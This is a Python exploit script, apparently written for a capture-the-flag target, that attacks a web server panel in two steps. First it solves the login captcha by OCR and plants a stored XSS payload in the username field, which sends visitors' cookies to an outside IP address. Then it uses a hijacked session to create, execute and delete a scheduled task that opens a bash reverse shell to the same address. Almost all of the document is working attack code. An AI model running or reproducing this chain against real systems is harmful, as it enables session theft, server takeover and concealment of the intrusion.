import requests
from urllib.parse import urljoin
import re
import ddddocr
from time import sleep

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest"
}

cookies = {
    "PHPSESSID": "ed489986cbfcd84118acf11b"
}

s = requests.session()

s.headers.update(headers)
s.cookies.update(cookies)

def inject_xss(url, xss_payload):
    # 获取验证码
    vercode_url = urljoin(url, "/service/app/account.php?type=vercode")
    r = s.get(vercode_url)
    with open("./vercode.png", "wb") as f:
        f.write(r.content)

    vercode = input("查看vercode.png文件(否则进行OCR识别)\n输入验证码：")

    if not vercode:
        # OCR识别验证码
        ocr = ddddocr.DdddOcr()
        vercode = ocr.classification(r.content)

    xss_url = urljoin(url, "/service/app/account.php")

    data = {
        "type": "login",
        "username": xss_payload,
        "password": "hack",
        "verifycode": vercode
    }
    r = s.post(xss_url, data=data)
    print(r.text)
    if "\\u7528\\u6237\\u540d\\u6216\\u8005\\u5bc6\\u7801\\u9519\\u8bef" in r.text:
        print("xss payload注入成功")


def exp(url, cookie, shell):
    s.cookies.update({"PHPSESSID": cookie})

    task_url = urljoin(url, "/service/app/tasks.php")
    
    # 创建计划任务
    sava_params = {"type": "save_shell"}
    sava_data = {
        "task_id": "",
        "title": "hack",
        "exec_cycle": 1,
        "week": 1,
        "day": 3,
        "hour": 1,
        "minute": 30,
        "shell": shell
    }
    r = s.post(task_url, params=sava_params, data=sava_data)

    if "\\u4fdd\\u5b58\\u6210\\u529f" in r.text:
        print("创建成功")
    
    sleep(1)
    # 获取计划任务tid
    sava_params = {"type": "task_list"}
    r = s.get(task_url, params=sava_params)
    tid = int(re.search(r'"ID":([0-9]+),"NAME":"hack"', r.text).group(1))

    # 执行计划任务
    exec_params = {"type": "exec_task"}
    exec_data = {
        "tid": tid
    }
    r = s.post(task_url, params=exec_params, data=exec_data)
    if "\\u6267\\u884c\\u6210\\u529f" in r.text:
        print("执行成功")
    
    # 删除计划任务
    del_params = {"type": "del_task"}
    del_data = {
        "tid": tid
    }
    r = s.post(task_url, params=del_params, data=del_data)
    if "\\u5220\\u9664\\u6210\\u529f" in r.text:
        print("删除成功")



if __name__ == "__main__":
    # <script>document.location="http://120.48.43.5:9999/cookie?cookie="+document.cookie</script>
    url = "http://7fb3a870-6fce-4148-9530-2e111c945dd4.node.yuzhian.com.cn:8000/"
    xss_payload = '<script>document.location="http://120.48.43.5:9999/cookie?cookie="+document.cookie</script>'
    inject_xss(url, xss_payload)
    cookie = input("请输入通过xss payload获取到的Cookie: ")
    shell = "bash -c 'bash -i >& /dev/tcp/120.48.43.5/9999 0>&1'"
    exp(url, cookie, shell)